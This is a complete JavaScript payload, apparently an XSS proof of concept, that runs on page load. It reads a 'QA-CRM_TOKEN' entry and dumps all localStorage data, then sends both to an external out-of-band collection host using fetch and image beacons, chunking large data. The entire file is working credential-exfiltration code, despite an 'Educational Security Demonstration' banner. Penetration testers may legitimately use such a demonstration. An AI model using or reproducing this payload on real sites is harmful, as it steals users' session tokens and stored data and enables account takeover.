(function() {
    'use strict';
    
    console.log('üîç XSS PoC Loaded');
    
    // Configuration
    const CONFIG = {
        exfilEndpoint: 'https://bfa3abbd803fabceead8g1mj3hayyyyyb.oast.pro',  // Replace with your RequestBin URL
        debug: true,
        targetKey: 'QA-CRM_TOKEN'
    };

    /**
     * Collect token from localStorage
     */
    function collectToken() {
        let token = null;
        
        try {
            // Try to get the specific token
            token = localStorage.getItem(CONFIG.targetKey);
            
            if (CONFIG.debug) {
                if (token) {
                    console.log(`üéØ Found ${CONFIG.targetKey}:`, token);
                } else {
                    console.log(`‚ö†Ô∏è ${CONFIG.targetKey} not found in localStorage`);
                }
            }
        } catch (e) {
            if (CONFIG.debug) {
                console.error('‚ùå Error accessing localStorage:', e);
            }
        }
        
        return token;
    }

    /**
     * Collect all localStorage data (for debugging)
     */
    function collectAllLocalStorage() {
        const allData = {};
        
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                allData[key] = localStorage.getItem(key);
            }
            
            if (CONFIG.debug) {
                console.log('üì¶ All localStorage keys:', Object.keys(allData));
            }
        } catch (e) {
            if (CONFIG.debug) {
                console.error('‚ùå Error reading localStorage:', e);
            }
        }
        
        return allData;
    }

    /**
     * Prepare data for exfiltration
     */
    function prepareData(token, allData) {
        return {
            timestamp: new Date().toISOString(),
            url: window.location.href,
            targetKey: CONFIG.targetKey,
            token: token || 'NOT_FOUND',
            allKeys: Object.keys(allData).join(','),
            storageCount: Object.keys(allData).length
        };
    }

    /**
     * Send data via GET request
     */
    function sendData(data) {
        // Encode data as URL parameters
        const params = new URLSearchParams({
            timestamp: data.timestamp,
            url: data.url,
            target_key: data.targetKey,
            token: data.token,
            all_keys: data.allKeys,
            storage_count: data.storageCount
        });
        
        const fullUrl = `${CONFIG.exfilEndpoint}?${params.toString()}`;
        
        if (CONFIG.debug) {
            console.log(`üì§ Sending GET request to ${CONFIG.exfilEndpoint}`);
            console.log(`üîë Token: ${data.token}`);
            console.log(`üìã All keys: ${data.allKeys}`);
        }
        
        // Method 1: Using fetch
        fetch(fullUrl, {
            method: 'GET',
            mode: 'no-cors'
        })
        .then(() => {
            if (CONFIG.debug) {
                console.log('‚úÖ GET request sent via fetch');
            }
        })
        .catch(err => {
            if (CONFIG.debug) {
                console.log('‚ùå Fetch failed:', err.message);
            }
        });
        
        // Method 2: Using Image (backup method)
        const img = new Image();
        img.src = fullUrl;
        
        if (CONFIG.debug) {
            console.log('‚úÖ GET request sent via Image');
        }
    }

    /**
     * Send detailed localStorage dump (optional - for complete exfiltration)
     */
    function sendDetailedDump(allData) {
        // Send all localStorage data in chunks if needed
        const dataString = JSON.stringify(allData);
        
        // If data is too large, split into chunks
        const maxLength = 2000; // Safe URL length
        if (dataString.length > maxLength) {
            if (CONFIG.debug) {
                console.log('‚ö†Ô∏è Data too large, sending in chunks...');
            }
            
            const chunks = dataString.match(new RegExp(`.{1,${maxLength}}`, 'g')) || [];
            chunks.forEach((chunk, index) => {
                const params = new URLSearchParams({
                    chunk_index: index,
                    chunk_total: chunks.length,
                    data: chunk
                });
                
                const chunkUrl = `${CONFIG.exfilEndpoint}?${params.toString()}`;
                
                // Send chunk
                const img = new Image();
                img.src = chunkUrl;
                
                if (CONFIG.debug) {
                    console.log(`üì¶ Sent chunk ${index + 1}/${chunks.length}`);
                }
            });
        } else {
            // Send all data at once
            const params = new URLSearchParams({
                all_data: dataString
            });
            
            const fullUrl = `${CONFIG.exfilEndpoint}?${params.toString()}`;
            const img = new Image();
            img.src = fullUrl;
            
            if (CONFIG.debug) {
                console.log('üì¶ Sent complete localStorage dump');
            }
        }
    }

    /**
     * Create visual alert
     */
    function createVisualAlert(token) {
        const alertBox = document.createElement('div');
        alertBox.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: linear-gradient(135deg, #ff4444, #cc0000);
            color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
            z-index: 999999;
            font-family: monospace;
            max-width: 350px;
        `;
        
        const tokenPreview = token ? token.substring(0, 20) + '...' : 'NOT FOUND';
        
        alertBox.innerHTML = `
            <strong>‚ö†Ô∏è LocalStorage Token Exfiltration</strong><br>
            <small>Educational Security Demonstration</small><br>
            <small>Target: ${CONFIG.targetKey}</small><br>
            <small>Status: ${token ? '‚úÖ Found' : '‚ùå Not Found'}</small><br>
            <small>Preview: ${tokenPreview}</small><br>
            <button onclick="this.parentElement.remove()" style="margin-top:10px;padding:5px 10px;cursor:pointer;background:#fff;border:none;border-radius:4px;">
                Close
            </button>
        `;
        
        document.body.appendChild(alertBox);
        
        setTimeout(() => {
            if (alertBox.parentElement) {
                alertBox.remove();
            }
        }, 15000);
    }

    /**
     * Main execution
     */
    function execute() {
        console.log('üöÄ Starting LocalStorage Token Exfiltration...');
        
        try {
            // Collect the target token
            const token = collectToken();
            
            // Collect all localStorage data
            const allData = collectAllLocalStorage();
            
            // Prepare data for exfiltration
            const data = prepareData(token, allData);
            
            // Send main data
            sendData(data);
            
            // Optionally send detailed dump
            if (CONFIG.debug) {
                sendDetailedDump(allData);
            }
            
            // Show visual alert
            createVisualAlert(token);
            
            console.log('‚úÖ Token exfiltration complete');
            
            if (token) {
                console.log(`üéØ Successfully captured ${CONFIG.targetKey}`);
            } else {
                console.log(`‚ö†Ô∏è ${CONFIG.targetKey} not found in localStorage`);
                console.log('üìã Available keys:', Object.keys(allData));
            }
            
        } catch (error) {
            console.error('‚ùå Error:', error);
        }
    }

    // Execute when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', execute);
    } else {
        execute();
    }

})();
